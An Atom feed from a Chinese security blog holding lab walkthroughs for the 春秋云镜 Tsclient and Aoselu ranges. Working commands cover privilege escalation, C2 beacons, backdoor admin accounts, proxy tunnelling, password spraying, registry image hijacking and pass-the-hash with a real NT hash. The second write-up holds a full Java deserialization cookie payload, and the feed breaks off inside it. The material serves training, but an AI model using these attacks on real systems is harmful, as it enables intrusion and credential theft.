<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>baozongwi:H@cking Th3 Fu1ure</title>
  
  
  <link href="https://baozongwi.xyz/atom.xml" rel="self"/>
  
  <link href="https://baozongwi.xyz/"/>
  <updated>2025-08-12T09:36:25.824Z</updated>
  <id>https://baozongwi.xyz/</id>
  
  <author>
    <name>baozongwi</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>春秋云镜Tsclient</title>
    <link href="https://baozongwi.xyz/posts/38461.html"/>
    <id>https://baozongwi.xyz/posts/38461.html</id>
    <published>2025-08-11T08:47:31.000Z</published>
    <updated>2025-08-12T09:36:25.824Z</updated>
    
    <content type="html"><![CDATA[<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p><a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 39.99.227.180 -p 1-65535</span><br></pre></td></tr></table></figure><p>扫描出来mssql的弱密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] mssql:39.99.227.180:1433:sa 1qaz!QAZ</span><br></pre></td></tr></table></figure><p>使用MDUT链接 <a href="https://github.com/SafeGroceryStore/MDUT/releases">https://github.com/SafeGroceryStore/MDUT/releases</a> 要使用JDK8，我写了一个bat文件</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="comment">rem 设置 Java 8 的路径</span></span><br><span class="line"><span class="built_in">SET</span> JAVA8_JRE=C:\Program Files\Java\jdk1.<span class="number">8</span>.<span class="number">0</span>_201\jre\bin</span><br><span class="line"><span class="built_in">SET</span> JAVA8_JDK=C:\Program Files\Java\jdk1.<span class="number">8</span>.<span class="number">0</span>_201\bin</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 临时修改 PATH，使 Java 8 的 JDK 和 JRE 生效</span></span><br><span class="line"><span class="built_in">SET</span> <span class="built_in">PATH</span>=<span class="variable">%JAVA8_JDK%</span>;<span class="variable">%JAVA8_JRE%</span>;<span class="variable">%PATH%</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 运行 JAR 文件</span></span><br><span class="line">java -jar Multiple.Database.Utilization.Tools-<span class="number">2</span>.<span class="number">1</span>.<span class="number">1</span>-jar-with-dependencies.jar</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 暂停以查看输出</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/1.png" alt="1"></p><p>链接之后激活组件，执行命令</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/PixPin_2025-08-12_15-41-22.png" alt="1"></p><p><strong>SeImpersonatePrivilege</strong>权限可以使用甜土豆提权到SYSTEM， <a href="https://github.com/uknowsec/SweetPotato">https://github.com/uknowsec/SweetPotato</a>  上传上去 <code>C:/Users/Public/SweetPotato.exe -a &quot;whoami&quot;</code>，为了方便管理，上线C2，新建一个监听器</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/PixPin_2025-08-12_15-37-18.png" alt="1"></p><p>生成一个<code>beacon.exe</code></p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/PixPin_2025-08-12_15-38-34.png" alt="1"></p><p>全部传上去之后运行<code>C:/Users/Public/SweetPotato.exe -a &quot;C:/Users/Public/beacon.exe&quot;</code>成功上线</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/PixPin_2025-08-12_15-45-41.png" alt="1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">whoami</span></span><br><span class="line">shell <span class="built_in">type</span> C:\Users\Administrator\flag\flag01.txt</span><br></pre></td></tr></table></figure><p>成功得到第一个 flag，新建一个用户到本地管理员，准备搭建代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net user test1 baozongwi123! /add</span><br><span class="line">shell net localgroup administrators test1 /add</span><br></pre></td></tr></table></figure><p>使用Ligolo-ng <a href="https://github.com/nicocha30/ligolo-ng/">https://github.com/nicocha30/ligolo-ng/</a> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 入口机里面运行</span></span><br><span class="line">start /B .\agent.exe -<span class="built_in">bind</span> 0.0.0.0:10010 &gt; agent.log 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># kali里面运行</span></span><br><span class="line"><span class="built_in">sudo</span> ./proxy -selfcert -laddr <span class="string">&quot;0.0.0.0:10001&quot;</span></span><br><span class="line">connect_agent --ip 39.99.226.192:10010</span><br><span class="line"></span><br><span class="line">interface_list</span><br><span class="line">session</span><br><span class="line">autoroute</span><br><span class="line"></span><br><span class="line"><span class="built_in">nohup</span> ./gost -L=socks://:1080 &gt; gost.log 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看是否开启</span></span><br><span class="line">ss -luntp</span><br></pre></td></tr></table></figure><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>利用fscan扫描内网机器存活</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面/Pentest/fscan]</span><br><span class="line">└─$ ./fscan -h 172.22.8.18/24       </span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.4</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">trying RunIcmp2</span></span><br><span class="line"><span class="string">The current user permissions unable to send icmp packets</span></span><br><span class="line"><span class="string">start ping</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.8.15     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.8.31     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.8.18     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.8.46     is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 4</span></span><br><span class="line"><span class="string">172.22.8.15:445 open</span></span><br><span class="line"><span class="string">172.22.8.46:139 open</span></span><br><span class="line"><span class="string">172.22.8.46:80 open</span></span><br><span class="line"><span class="string">172.22.8.18:139 open</span></span><br><span class="line"><span class="string">172.22.8.18:80 open</span></span><br><span class="line"><span class="string">172.22.8.31:139 open</span></span><br><span class="line"><span class="string">172.22.8.15:135 open</span></span><br><span class="line"><span class="string">172.22.8.18:1433 open</span></span><br><span class="line"><span class="string">172.22.8.46:135 open</span></span><br><span class="line"><span class="string">172.22.8.18:135 open</span></span><br><span class="line"><span class="string">172.22.8.46:445 open</span></span><br><span class="line"><span class="string">172.22.8.15:139 open</span></span><br><span class="line"><span class="string">172.22.8.18:445 open</span></span><br><span class="line"><span class="string">172.22.8.31:445 open</span></span><br><span class="line"><span class="string">172.22.8.31:135 open</span></span><br><span class="line"><span class="string">172.22.8.15:88 open</span></span><br><span class="line"><span class="string">172.22.8.18:10010 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 17</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.8.31</span></span><br><span class="line"><span class="string">   [-&gt;]WIN19-CLIENT</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.8.31</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.8.46</span></span><br><span class="line"><span class="string">   [-&gt;]WIN2016</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.8.46</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.8.18</span></span><br><span class="line"><span class="string">   [-&gt;]WIN-WEB</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.8.18</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.8.15</span></span><br><span class="line"><span class="string">   [-&gt;]DC01</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.8.15</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01           </span></span><br><span class="line"><span class="string">[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         </span></span><br><span class="line"><span class="string">[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span></span><br><span class="line"><span class="string">[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ</span></span><br></pre></td></tr></table></figure><p>整理一下</p><ul><li>172.22.8.15 XIAORANG\DC01</li><li>172.22.8.31 XIAORANG\WIN19-CLIENT</li><li>172.22.8.18 已拿下</li><li>172.22.8.46 WIN2016.xiaorang.lab</li></ul><p>刚才找flag的时候，我发现了一个用户John，查看用户会话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net <span class="built_in">users</span> </span><br><span class="line">shell query user</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/PixPin_2025-08-12_16-01-09.png" alt="1"></p><p>进程注入这个用户</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/PixPin_2025-08-12_16-03-08.png" alt="1"></p><p>成功上线John用户</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/PixPin_2025-08-12_16-06-18.png" alt="1"></p><p>看看网络共享</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell net use</span><br><span class="line"></span><br><span class="line">shell <span class="built_in">dir</span> \\TSCLIENT\C</span><br><span class="line">shell <span class="built_in">type</span> \\TSCLIENT\C\credential.txt</span><br></pre></td></tr></table></figure><p>得到了一个域用户<code>xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#</code>，喷洒攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec rdp 172.22.8.0/24 -u <span class="string">&#x27;Aldrich&#x27;</span> -p <span class="string">&#x27;Ald@rLMWuy7Z!#&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/PixPin_2025-08-12_16-15-12.png" alt="1"></p><p>要么过期要么登录失败，过期可以修改密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smbpasswd -r 172.22.8.15 -U xiaorang.lab/Aldrich</span><br><span class="line"></span><br><span class="line">Ald@rLMWuy7Z!#</span><br><span class="line">Whoami@666</span><br><span class="line">Whoami@666</span><br></pre></td></tr></table></figure><p>RDP上去查看注册表</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Acl</span> <span class="literal">-path</span> <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | <span class="built_in">fl</span> *</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/2.png" alt="1"></p><p>所有正常登录的用户都有权限修改注册表，修改注册表映像劫持，把本来用户主页点放大镜启动的<code>magnify.exe</code>替换成<code>C:\windows\system32\cmd.exe</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span></span><br></pre></td></tr></table></figure><p>锁定用户，再在右下角的放大镜打开就是SYSTEM，同样的上线C2，现在先在入口机建立一个监听器</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Users\Aldrich\Desktop</span><br><span class="line">beacon1.exe</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/PixPin_2025-08-12_16-28-38.png" alt="1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">type</span> C:\Users\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure><p>再利用SharpHound收集域内信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe -c all</span><br></pre></td></tr></table></figure><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>查看域内管理员发现有WIN2016$</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/PixPin_2025-08-12_16-42-39.png" alt="1"></p><p>看看出站对象控制</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/PixPin_2025-08-12_16-46-01.png" alt="1"></p><p>可以直达DC01，并且再一看发现</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/PixPin_2025-08-12_16-48-34.png" alt="1"></p><p>这个玩意也是域控，查看机器用户权限</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/PixPin_2025-08-12_16-50-12.png" alt="1"></p><p>发现<strong>SeDebugPrivilege</strong>权限（SYSTEM用户都有），可以读取 LSASS，在CS4.2运行<code>logonpasswords</code>获得机器<code>NTHash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netexec wmi 172.22.8.15 -u WIN2016$ -H d3048f817ff9098184db91ef77f2d76e -d xiaorang -x &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">netexec wmi 172.22.8.15 -u WIN2016$ -H d3048f817ff9098184db91ef77f2d76e -d xiaorang -x &quot;type C:\Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">MDUT、SeImpersonatePrivilege提权、C2基础使用、进程注入、放大镜提权、SeDebugPrivilege权限利用</summary>
    
    
    
    <category term="春秋云镜" scheme="https://baozongwi.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
    
    
    <category term="Pentest" scheme="https://baozongwi.xyz/tags/Pentest/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜Aoselu</title>
    <link href="https://baozongwi.xyz/posts/58683.html"/>
    <id>https://baozongwi.xyz/posts/58683.html</id>
    <published>2025-08-10T13:25:22.000Z</published>
    <updated>2025-08-11T03:45:29.997Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本靶场以虚构汽车制造企业 Aoselu 为背景，模拟其真实企业内部网络环境，玩家需要进行信息收集、权限提升、横向移动、服务利用等内网渗透技术，逐步获取4个flag。 目前已通过信息收集获得该企业某员工的邮箱 ：<a href="mailto:&#114;&#x61;&#x63;&#104;&#x65;&#108;&#x2e;&#99;&#x6f;&#x6f;&#x6b;&#x39;&#64;&#97;&#111;&#x73;&#101;&#108;&#x75;&#97;&#x75;&#x74;&#111;&#x2e;&#99;&#111;&#x6d;">&#114;&#x61;&#x63;&#104;&#x65;&#108;&#x2e;&#99;&#x6f;&#x6f;&#x6b;&#x39;&#64;&#97;&#111;&#x73;&#101;&#108;&#x75;&#97;&#x75;&#x74;&#111;&#x2e;&#99;&#111;&#x6d;</a>&#x2F;!QAZ2wsx</p></blockquote><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>先扫描一下，8080端口发现了登录接口，登录进去之后，发现没见过这个系统，可能是自己二开的，抓个包，发现Cookie是Java反序列化一样的payload</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CAoselu/1.png" alt="1"></p><p>测试之后发现这条链子可以打</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CAoselu/2.png" alt="1"></p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CAoselu/3.png" alt="1"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/mail/u/0/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39.99.158.15:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://39.99.158.15:8080/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>userInfo=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAADaDK/rq+AAAANADUCgAiAGUJADsAZgoADABnCABoCgAMAGkIAGoHAGsJADsAbAoABwBtCgA7AG4KAAwAbwcAcAgAcQoAcgBzCgAMAHQIAHUKAAwAdggAPggAdwgAeAgAeQoAegB7CgB6AHwKAH0AfgoABwB/BwCACgCBAIIKAIEAgwgAhAoAhQCGCACHBwCICgAgAIkHAIoKAIsAjAgAjQgAjggAjwgAkAoAIACRCgAiAJIIAJMKAIsAlAkAOwCVCACWCACXCQA7AJgIAJkKAAcAmgoABwCbCACcCACdCACeCACfCACgCAChCACiCgA7AKMHAKQBAAloZWFkZXJLZXkBABJMamF2YS9sYW5nL1N0cmluZzsBAANjbWQBAAZhY3Rpb24BAAhwb3NpdGlvbgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAUTHBheWxvYWQvU3ByaW5nRWNobzsBAAVzdGFydAEABXZhcjExAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHAHAHAEoHAIABAARFY2hvAQAWKExqYXZhL3V0aWwvU2Nhbm5lcjspVgEAB3NjYW5uZXIBABNMamF2YS91dGlsL1NjYW5uZXI7AQAEdmFyMAEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyMQEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAEdmFyMgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABHZhcjQBAAR2YXI2AQAEdmFyNwEABHZhcjgHAGsHAIgHAKUHAIoBAApFeGNlcHRpb25zAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAPU3ByaW5nRWNoby5qYXZhDABBAEIMAD8APQwApgCnAQAEZWNobwwAqACpAQAEZXhlYwEAEWphdmEvdXRpbC9TY2FubmVyDAA+AD0MAEEAqgwATwBQDACrAKwBABBqYXZhL2xhbmcvU3RyaW5nAQAHb3MubmFtZQcArQwArgCvDACwALEBAANXSU4MALIAswEAAi9jAQAHL2Jpbi9zaAEAAi1jBwC0DAC1ALYMAGoAtwcAuAwAuQC6DABBALsBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwC8DAC9AL4MAL8AwAEAPG9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQucmVxdWVzdC5SZXF1ZXN0Q29udGV4dEhvbGRlcgcAwQwAwgDDAQAUZ2V0UmVxdWVzdEF0dHJpYnV0ZXMBAA9qYXZhL2xhbmcvQ2xhc3MMAMQAxQEAEGphdmEvbGFuZy9PYmplY3QHAKUMAMYAxwEAQG9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQucmVxdWVzdC5TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMBAAtnZXRSZXNwb25zZQEAHWphdmF4LnNlcnZsZXQuU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyDADIAMUMAMkAygEACWFkZEhlYWRlcgwAywDMDABAAD0BAAZoZWFkZXIBAARib2R5DAA8AD0BAAJcQQwAzQDODADPALEBAAdwcmludGxuAQAFZmx1c2gBAAVjbG9zZQEABEV0YWcBAAZscyAtYWwBAARleGVjAQAEYm9keQwASABCAQAIRWdFZGVFSU8BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAhoYXNoQ29kZQEAAygpSQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAB2lzRW1wdHkBAAMoKVoBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvVXBwZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARZ2V0RGVjbGFyZWRNZXRob2QBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEADHVzZ